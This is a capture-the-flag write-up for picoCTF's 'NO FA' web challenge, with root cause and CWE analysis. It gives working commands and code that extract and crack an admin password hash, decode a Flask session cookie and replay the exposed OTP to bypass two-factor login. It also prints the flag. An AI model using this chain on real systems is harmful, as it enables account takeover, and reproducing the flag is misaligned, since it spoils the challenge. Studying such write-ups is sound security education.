# NO FA

**Platform:** CyLab Security Academy (picoCTF)
**Category:** Web Exploitation
**Difficulty:** Medium
**Flag:** `picoCTF{n0_r4t3_n0_4uth_6db141c5}`

## Summary

A Flask expense tracker leaks its own source code and its full user database. Cracking the
admin account's password hash from the leaked database gets past step one of login; the app's
own OTP based two factor step is defeated the same way as this platform's earlier "IntroToBurp"
challenge, since the OTP is generated server side and stored in the client's session cookie
without ever actually being emailed, and that cookie is signed but not encrypted.

## Discovery

The challenge provides `app.py` and `users.db` directly. Reading the source shows the full auth
flow:

```python
@app.route('/login', methods=['GET', 'POST'])
def login():
    ...
    user = db.get_user_by_username(username)
    if user and hashlib.sha256(password.encode()).hexdigest() == user['password']:
        if user['two_fa']:
            otp = str(random.randint(1000, 9999))
            session['otp_secret'] = otp
            session['otp_timestamp'] = time.time()
            session['username'] = username
            session['logged'] = 'false'
            # send OTP to mail ---
            return redirect(url_for('two_fa'))
```

The `# send OTP to mail` line is only a comment. No actual email is ever sent. The OTP is written
straight into the Flask session, which (as with any default Flask app) is only cryptographically
signed, not encrypted, so its contents are fully readable by whoever holds the cookie, in this
case the same person who is supposed to be receiving the OTP by a separate channel.

`users.db` is a SQLite database with a `users` table holding `username`, `email`, a SHA256
password hash, and a `two_fa` flag. The `admin` row has `two_fa = 1`.

## Proof of Concept

Crack the admin password hash from the leaked database with a wordlist:

```
sqlite3 users.db "SELECT password FROM users WHERE username='admin';"
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67

hashcat -m 1400 -a 0 admin_hash.txt /usr/share/wordlists/rockyou.txt
```

```
c20fa16907343eef642d10f0bdb81bf629e6aaf6c906f26eabda079ca9e5ab67:apple@123
```

Log in with the recovered credentials:

```
curl -s -i -c cj.txt -X POST http://TARGET/login -d "username=admin&password=apple@123"
```

This redirects to `/two_fa`, and the response `Set-Cookie` holds the session. Flask session
cookies use the format `<base64(zlib(payload))>.<timestamp>.<signature>`; decoding the middle
segment (no key needed, since signing does not imply encryption):

```python
import base64, zlib
raw = "<session cookie value>"
payload_b64 = raw.split(".")[1]
pad = "=" * (-len(payload_b64) % 4)
print(zlib.decompress(base64.urlsafe_b64decode(payload_b64 + pad)).decode())
```

```json
{"logged":"false","otp_secret":"9301","otp_timestamp":1786706927.16,"username":"admin"}
```

Submit the recovered OTP and load the homepage as a fully authenticated admin:

```
curl -s -c cj.txt -b cj.txt -X POST http://TARGET/two_fa -d "otp=9301"
curl -s -b cj.txt http://TARGET/
```

## Root Cause

Three compounding issues:

1. Source code and a full database dump were both directly reachable, handing over the exact
   auth logic and every user's password hash with no guessing required.
2. Password hashing is a single unsalted SHA256 pass, making common passwords trivially
   crackable with a standard wordlist.
3. The two factor mechanism's secret value is delivered to the client via the same session
   cookie the client already controls, instead of a genuinely separate channel (email, SMS,
   authenticator app). Signing a cookie proves it was not tampered with; it does nothing to hide
   its contents from the party holding it, which defeats the entire point of a second factor
   here.

## CWE / OWASP

- **CWE-916**: Use of Password Hash With Insufficient Computational Effort
- **CWE-330**: Use of Insufficiently Random Values (client-visible OTP delivery)
- **CWE-522**: Insufficiently Protected Credentials
- **OWASP A02:2021**: Cryptographic Failures
- **OWASP A07:2021**: Identification and Authentication Failures
